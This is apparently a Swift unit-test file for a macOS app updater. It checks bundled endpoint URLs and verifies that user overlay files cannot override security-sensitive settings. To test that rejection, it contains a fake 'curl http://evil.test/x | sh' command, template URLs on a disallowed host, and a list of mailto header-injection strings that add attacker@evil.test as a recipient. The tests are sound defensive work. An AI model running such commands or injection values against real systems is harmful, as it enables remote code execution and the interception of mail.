import XCTest
@testable import MacUpdaterCore

final class AppEndpointsTests: XCTestCase {
    // MARK: Bundled resource loads and the shared accessor resolves

    func testBundledEndpointsDecode() throws {
        let endpoints = try AppEndpoints.loadBundled()
        XCTAssertFalse(endpoints.googleDriveOmaha.isEmpty)
        XCTAssertFalse(endpoints.caskDatabase.isEmpty)
    }

    func testSharedResolvesWithoutCrashing() {
        // `shared` fatal-errors if the bundled resource is missing/malformed,
        // so simply touching it exercises the launch-time contract.
        XCTAssertNotNil(AppEndpoints.shared.googleDriveOmahaURL.scheme)
    }

    // The CatalogRefresher source endpoint must be present in the bundled config
    // (the launch-time refresh + the Info "Odśwież katalog" button both read it).
    func testAppCatalogEndpointIsConfigured() throws {
        let e = try AppEndpoints.loadBundled()
        XCTAssertEqual(e.appCatalogURL.scheme, "https")
        XCTAssertTrue(e.appCatalog.hasSuffix("app-catalog.json"),
                      "catalog source should point at an app-catalog.json document")
    }

    // UX-14: the Inventory "report this app" button opens a prefilled GitHub issue against
    // this endpoint, so it must be present and point at an `issues/new` document.
    func testProjectNewIssueEndpointIsConfigured() throws {
        let e = try AppEndpoints.loadBundled()
        XCTAssertEqual(e.projectNewIssueURL.scheme, "https")
        XCTAssertEqual(e.projectNewIssueURL.absoluteString,
                       "https://github.com/DominikSienkiewicz/WegaMacUpdater/issues/new")
    }

    // Zgłoszenie błędu z zakładki Logi otwiera domyślnego klienta poczty pod tym adresem,
    // więc musi być obecny w konfiguracji — inaczej kanał e-mail cicho przestaje istnieć.
    func testSupportEmailIsConfigured() throws {
        let e = try AppEndpoints.loadBundled()
        XCTAssertEqual(e.supportEmailAddress, "wegamacupdater.unbroken239@passmail.net")
        XCTAssertTrue(e.supportEmailAddress.contains("@"), "musi być adresem, nie URL-em")
        XCTAssertFalse(e.supportEmailAddress.hasPrefix("mailto:"),
                       "schemat dokłada builder — konfiguracja trzyma sam adres")
    }

    // MARK: Fixed endpoints keep the exact URLs the checkers used to hard-code

    func testFixedEndpointsMatchLegacyValues() throws {
        let e = try AppEndpoints.loadBundled()
        XCTAssertEqual(e.chatgptAppcastURL.absoluteString,
                       "https://persistent.oaistatic.com/sidekick/public/sparkle_public_appcast.xml")
        XCTAssertEqual(e.googleDriveOmahaURL.absoluteString,
                       "https://tools.google.com/service/update2")
        XCTAssertEqual(e.caskDatabaseURL.absoluteString,
                       "https://formulae.brew.sh/api/cask.json")
        XCTAssertEqual(e.homebrewWebsiteURL.absoluteString, "https://brew.sh")
        XCTAssertEqual(e.googleDriveDownloadURL.absoluteString,
                       "https://www.google.com/drive/download/")
        XCTAssertEqual(e.projectRepositoryURL.absoluteString,
                       "https://github.com/DominikSienkiewicz/WegaMacUpdater")
        XCTAssertEqual(e.projectIssuesURL.absoluteString,
                       "https://github.com/DominikSienkiewicz/WegaMacUpdater/issues")
        XCTAssertEqual(e.authorLinkedInURL.absoluteString,
                       "https://www.linkedin.com/in/dominik-sienkiewicz/")
        XCTAssertEqual(e.masRepositoryURL.absoluteString, "https://github.com/mas-cli/mas")
        XCTAssertEqual(e.signalUpdateURL.absoluteString,
                       "https://updates.signal.org/desktop/latest-mac.yml")
        XCTAssertEqual(e.homebrewInstallCommand,
                       #"/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)""#)
    }

    // MARK: Templated endpoints substitute placeholders into the legacy URLs

    func testTemplatedEndpointsFillPlaceholders() throws {
        let e = try AppEndpoints.loadBundled()
        XCTAssertEqual(e.jetbrainsReleasesURL(code: "IIU")?.absoluteString,
                       "https://data.services.jetbrains.com/products/releases?code=IIU&latest=true&type=release")
        XCTAssertEqual(e.githubLatestReleaseURL(repo: "microsoft/vscode")?.absoluteString,
                       "https://api.github.com/repos/microsoft/vscode/releases/latest")
        XCTAssertEqual(e.synologyChangeLogURL(identify: "SynologyDriveClient")?.absoluteString,
                       "https://www.synology.com/api/releaseNote/findChangeLog?identify=SynologyDriveClient&lang=enu")
        XCTAssertEqual(e.antigravityUpdateURL(platform: "darwin-arm64")?.absoluteString,
                       "https://antigravity-ide-auto-updater-974169037036.us-central1.run.app/api/update/darwin-arm64/stable/latest")
        XCTAssertEqual(e.parallelsUpdatesURL(major: 26)?.absoluteString,
                       "https://update.parallels.com/desktop/v26/parallels/parallels_updates.xml")
        XCTAssertEqual(e.postmanUpdateURL(version: "12.15.6")?.absoluteString,
                       "https://dl.pstmn.io/update/osx_64/12.15.6")
        XCTAssertEqual(e.discordUpdateURL(channel: "canary", version: "0.0.966")?.absoluteString,
                       "https://discord.com/api/updates/canary?platform=osx&version=0.0.966")
        XCTAssertEqual(e.chromeVersionsURL(channel: "canary")?.absoluteString,
                       "https://versionhistory.googleapis.com/v1/chrome/platforms/mac/channels/canary/versions")
        XCTAssertEqual(e.githubReleasesPageURL(repo: "owner/app")?.absoluteString,
                       "https://github.com/owner/app/releases/latest")
    }

    // MARK: Overlay semantics — a user file may redirect a single endpoint

    func testOverlayOverridesOnlyTheProvidedKey() throws {
        let base = try AppEndpoints.loadBundled()
        let overlay = AppEndpointsOverlay(
            jetbrainsReleases: nil,
            chatgptAppcast: nil,
            googleDriveOmaha: "https://example.test/omaha",
            caskDatabase: nil,
            appCatalog: nil,
            githubLatestRelease: nil,
            synologyChangeLog: nil,
            antigravityUpdate: nil,
            parallelsUpdates: nil,
            postmanUpdate: nil,
            discordUpdate: nil,
            signalUpdate: nil,
            chromeVersions: nil,
            homebrewWebsite: nil,
            homebrewInstallCommand: nil,
            githubReleasesPage: nil,
            googleDriveDownload: nil,
            projectRepository: nil,
            projectIssues: nil,
            authorLinkedIn: nil,
            masRepository: nil
        )
        let merged = base.overlaying(overlay)
        XCTAssertEqual(merged.googleDriveOmaha, "https://example.test/omaha", "overlay key must win")
        XCTAssertEqual(merged.caskDatabase, base.caskDatabase, "untouched keys keep the baseline")
    }

    // MARK: Overlay decoded from a file on disk (the user-writable redirect file)

    func testDecodeOverlayFromFileReadsOnlyProvidedKeys() throws {
        let tmp = FileManager.default.temporaryDirectory
            .appendingPathComponent("wega-overlay-\(UUID().uuidString).json")
        defer { try? FileManager.default.removeItem(at: tmp) }
        try #"{"googleDriveOmaha":"https://example.test/omaha"}"#
            .write(to: tmp, atomically: true, encoding: .utf8)

        let overlay = try AppEndpoints.decodeOverlay(contentsOf: tmp)
        XCTAssertEqual(overlay.googleDriveOmaha, "https://example.test/omaha")
        XCTAssertNil(overlay.caskDatabase, "keys absent from the file decode to nil so the baseline shows through")

        // End-to-end: an on-disk overlay redirects exactly one endpoint.
        let merged = try AppEndpoints.loadBundled().overlaying(overlay)
        XCTAssertEqual(merged.googleDriveOmaha, "https://example.test/omaha")
    }

    func testDecodeOverlayRejectsMalformedFile() throws {
        let tmp = FileManager.default.temporaryDirectory
            .appendingPathComponent("wega-overlay-bad-\(UUID().uuidString).json")
        defer { try? FileManager.default.removeItem(at: tmp) }
        try "not valid json".write(to: tmp, atomically: true, encoding: .utf8)
        XCTAssertThrowsError(try AppEndpoints.decodeOverlay(contentsOf: tmp))
    }

    // MARK: SEC-08 — the whole config channel is fail-closed, not only the catalog

    /// Criterion 1: the Homebrew install command is a shell string the Info UI offers to copy.
    /// An overlay must never be able to swap it for an attacker-controlled command.
    func testOverlayCannotSubstituteTheShellInstallCommand() throws {
        let base = try AppEndpoints.loadBundled()
        let overlay = try JSONDecoder().decode(
            AppEndpointsOverlay.self,
            from: Data(#"{"homebrewInstallCommand":"curl http://evil.test/x | sh"}"#.utf8)
        )
        let merged = base.overlaying(overlay)
        XCTAssertEqual(merged.homebrewInstallCommand, base.homebrewInstallCommand,
                       "the overlay's shell command must be ignored; the baseline installer command stands")
    }

    /// Criterion 2: a templated endpoint override pointing at a host the bundled config does not
    /// already trust must fall back to the baseline.
    func testOverlayRejectsTemplateEndpointOnDisallowedHost() throws {
        let base = try AppEndpoints.loadBundled()
        let overlay = try JSONDecoder().decode(
            AppEndpointsOverlay.self,
            from: Data(#"{"githubLatestRelease":"https://evil.example/repos/{repo}/releases/latest"}"#.utf8)
        )
        let merged = base.overlaying(overlay)
        XCTAssertEqual(merged.githubLatestRelease, base.githubLatestRelease,
                       "a template override on a host outside the allowlist must be ignored")
    }

    /// Criterion 2: templated endpoints are https-only under SEC-08 — an http override is refused
    /// even when it keeps an allowlisted host.
    func testOverlayRejectsTemplateEndpointOverHTTP() throws {
        let base = try AppEndpoints.loadBundled()
        let overlay = try JSONDecoder().decode(
            AppEndpointsOverlay.self,
            from: Data(#"{"githubLatestRelease":"http://api.github.com/repos/{repo}/releases/latest"}"#.utf8)
        )
        let merged = base.overlaying(overlay)
        XCTAssertEqual(merged.githubLatestRelease, base.githubLatestRelease,
                       "an http template override must be ignored even on an allowlisted host")
    }

    /// Criterion 2: a legitimate https override on a host the baseline already talks to is still
    /// applied, and the templated accessor keeps filling its placeholders.
    func testOverlayAcceptsHTTPSTemplateEndpointOnAllowlistedHost() throws {
        let base = try AppEndpoints.loadBundled()
        let override = "https://api.github.com/repos/{repo}/releases/latest?per_page=1"
        let overlay = try JSONDecoder().decode(
            AppEndpointsOverlay.self,
            from: Data(#"{"githubLatestRelease":"https://api.github.com/repos/{repo}/releases/latest?per_page=1"}"#.utf8)
        )
        let merged = base.overlaying(overlay)
        XCTAssertEqual(merged.githubLatestRelease, override,
                       "an https override on an allowlisted host is applied")
        XCTAssertEqual(merged.githubLatestReleaseURL(repo: "o/r")?.absoluteString,
                       "https://api.github.com/repos/o/r/releases/latest?per_page=1",
                       "the templated accessor still fills placeholders in the applied override")
    }

    /// Criterion 2, address edition: `supportEmail` is the one endpoint that is not a URL, so
    /// `validURL` cannot judge it — and merging it unchecked let a user-writable overlay
    /// redirect every bug report to someone else's mailbox, or smuggle extra `mailto:`
    /// headers into the URL the mail client opens. A well-formed address is still applied.
    func testOverlayAcceptsAWellFormedSupportAddress() throws {
        let base = try AppEndpoints.loadBundled()
        let overlay = try JSONDecoder().decode(
            AppEndpointsOverlay.self,
            from: Data(#"{"supportEmail":"maintainer@example.test"}"#.utf8)
        )
        XCTAssertEqual(base.overlaying(overlay).supportEmailAddress, "maintainer@example.test",
                       "a plain address override is legitimate and must be applied")
    }

    func testOverlayRejectsMalformedSupportAddresses() throws {
        let base = try AppEndpoints.loadBundled()
        let rejected = [
            "victim@example.test?bcc=attacker@evil.test&body=",  // extra mailto headers
            "victim@example.test&bcc=attacker@evil.test",
            "victim@example.test#fragment",
            "victim@example.test\nBcc: attacker@evil.test",      // header injection via a newline
            // RFC 6068 makes `to` a comma-separated list that the mail client
            // percent-decodes, so a comma plus `%40` adds a second recipient while still
            // reading as one literal `@`.
            "victim@example.test,attacker%40evil.test",
            "victim;tag@example.test",                           // `;` is a list separator too
            "victim%40attacker.evil.test@example.test",          // percent-encoding hides an `@`
            "victim @example.test",                              // whitespace breaks the URL apart
            "no-at-sign.example.test",
            "two@at@example.test",
            "@example.test",
            "local@",
            "pocztą@example.test",                               // non-ASCII: URL(string:) refuses it
            "",
        ]
        for address in rejected {
            let data = try JSONSerialization.data(withJSONObject: ["supportEmail": address])
            let overlay = try JSONDecoder().decode(AppEndpointsOverlay.self, from: data)
            XCTAssertEqual(base.overlaying(overlay).supportEmailAddress, base.supportEmailAddress,
                           "overlay address \(address.debugDescription) must fall back to the baseline")
        }
    }

    // MARK: SEC-08 — the presence of an unverified overlay is a first-class, surfaced state

    /// Criterion 3: an applied, unsigned overlay is the state the Info card must surface — not
    /// just a `log.warning`.
    func testOverlayStatusReportsUnverifiedWhenAppliedWithoutSignature() {
        let status = AppEndpoints.resolveOverlayStatus(
            fileExists: true, signaturePresent: false, signatureValid: false, signingConfigured: true
        )
        XCTAssertEqual(status, .appliedUnverified)
        XCTAssertTrue(status.isUnverifiedOverlayActive)
    }

    func testOverlayStatusReportsVerifiedForAValidlySignedOverlay() {
        let status = AppEndpoints.resolveOverlayStatus(
            fileExists: true, signaturePresent: true, signatureValid: true, signingConfigured: true
        )
        XCTAssertEqual(status, .appliedVerified)
        XCTAssertFalse(status.isUnverifiedOverlayActive)
    }

    func testOverlayStatusIsAbsentWithoutAFileOrForARejectedOverlay() {
        XCTAssertEqual(
            AppEndpoints.resolveOverlayStatus(
                fileExists: false, signaturePresent: false, signatureValid: false, signingConfigured: true
            ),
            .absent
        )
        // Present but mis-signed while signing is configured → rejected → baseline in effect.
        let rejected = AppEndpoints.resolveOverlayStatus(
            fileExists: true, signaturePresent: true, signatureValid: false, signingConfigured: true
        )
        XCTAssertEqual(rejected, .absent)
        XCTAssertFalse(rejected.isUnverifiedOverlayActive)
    }
}
